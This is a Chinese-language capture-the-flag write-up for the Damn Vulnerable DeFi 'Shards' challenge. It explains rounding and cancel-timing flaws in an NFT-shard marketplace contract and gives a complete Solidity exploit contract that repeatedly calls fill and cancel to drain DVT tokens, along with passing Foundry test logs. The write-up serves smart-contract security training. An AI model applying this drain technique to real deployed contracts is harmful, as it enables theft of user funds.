## 题目 [Shards](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/shards)

Shards NFT 市场是一个无需许可的智能合约，允许 Damn Valuable NFT 持有者以任何价格（以 USDC 表示）出售他们的 NFT。  

这些 NFT 可能非常值钱，以至于卖家可以将它们分割成更小的部分（“碎片”）。买家可以购买这些碎片，碎片通过 ERC1155 代币来表示。市场只有在整个 NFT 售出后才会支付卖家款项。  

市场向卖家收取 1% 的费用，以 Damn Valuable Tokens（DVT）支付。这些 DVT 可以存储在一个安全的链上金库中，而金库会进一步集成 DVT 质押系统。  

有人正在出售一个 NFT，价格高达……哇，一百万 USDC？  

你最好在那些投机者发现之前调查一下这个市场。  

你一开始没有 DVT。尽可能在一次交易中抢救资金，并将资产存入指定的恢复账户。  

要求：  
1. 质押合约的余额没有变化。
2. Marketplace 合约的代币减少：  
计算 marketplace 合约中减少的代币数量 missingTokens，并且要求这个数量大于 initialTokensInMarketplace 的 0.01%。initialTokensInMarketplace 为 750 ether DVT，那么我们需要取走至少 0.075 ether DVT。  
3. 所有恢复的资金被发送到 recovery 账户：  
要求 recovery 账户中的代币数量等于 missingTokens，即所有从 marketplace 中恢复的资金都被成功转移到了 recovery 账户。同时，player 账户中的代币余额为 0。  
4. 玩家只能执行一次交易。  

## 题解
1. 购买碎片的漏洞 (fill):
fill 函数中使用了 mulDivDown 方法，它的计算会产生向下取整的结果：  
``` solidity
paymentToken.transferFrom(
    msg.sender, address(this), want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
);
```
由于 `offer.totalShards` 非常大，即使 `want` 不为 0，在经过 `mulDivDown` 计算后，实际支付的 DVT 代币数量可能为 0。因此我们可以用 0 个 DVT 代币购买到少量碎片。 

2. 取消购买的漏洞 (cancel):  
cancel 函数中的时间限制逻辑存在问题，导致买家可以在购买后立即取消操作：  
``` solidity
if (
    purchase.timestamp + CANCEL_PERIOD_LENGTH < block.timestamp
        || block.timestamp > purchase.timestamp + TIME_BEFORE_CANCEL
) revert BadTime();
```
取消购买时，市场会退还买家的 DVT，并且计算方式使用了 `mulDivUp`，会向上取整：   
``` solidity
paymentToken.transfer(buyer, purchase.shards.mulDivUp(purchase.rate, 1e6));
```
这样买家可以通过 cancel 获取更多的 DVT 代币。  

POC:
通过结合 fill 函数的 0 代币购买漏洞和 cancel 函数的超额退款机制，我们可以在一次交易中反复进行购买和取消操作，逐步从市场中获取 DVT。
``` solidity
    function test_shards() public checkSolvedByPlayer {
        ShardsExploit exploit = new ShardsExploit(marketplace, token, recovery);

        for (uint256 i; i < 500; i++) {
            uint256 shards = exploit.getMaxWant(i);
            if (shards > 0) {
                console.log("want:", i - 1); // 找到最大购买量
                break;
            }
        }

        console.log("get DVT:", exploit.getDVT(100)); // 7500000000000

        exploit.attack(1);
    }

contract ShardsExploit {
    using FixedPointMathLib for uint256;

    ShardsNFTMarketplace public marketplace;
    DamnValuableToken public token;
    address recovery;

    uint256 constant MARKETPLACE_INITIAL_RATE = 75e15;
    uint112 constant NFT_OFFER_PRICE = 1_000_000e6;
    uint112 constant NFT_OFFER_SHARDS = 10_000_000e18;

    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
        marketplace = _marketplace;
        token = _token;
        recovery = _recovery;
    }

    function attack(uint64 offerId) external {
        uint256 wantShards = 100;

        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }

        token.transfer(recovery,token.balanceOf(address(this)));
    }

    function getMaxWant(uint256 want) public pure returns (uint256) {
        return want.mulDivDown(_toDVT(NFT_OFFER_PRICE, MARKETPLACE_INITIAL_RATE), NFT_OFFER_SHARDS);
    }

    function getDVT(uint256 want) public pure returns (uint256) {
        return want.mulDivUp(MARKETPLACE_INITIAL_RATE, 1e6);
    }

    function _toDVT(uint256 _value, uint256 _rate) private pure returns (uint256) {
        return _value.mulDivDown(_rate, 1e6);
    }

}

```
验证结果：  
```
forge test --mp test/shards/Shards.t.sol -vv

[PASS] test_assertInitialState() (gas: 80211)
[PASS] test_shards() (gas: 823240180)
Logs:
  want: 133
  get DVT: 7500000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 353.45ms (344.89ms CPU time)
```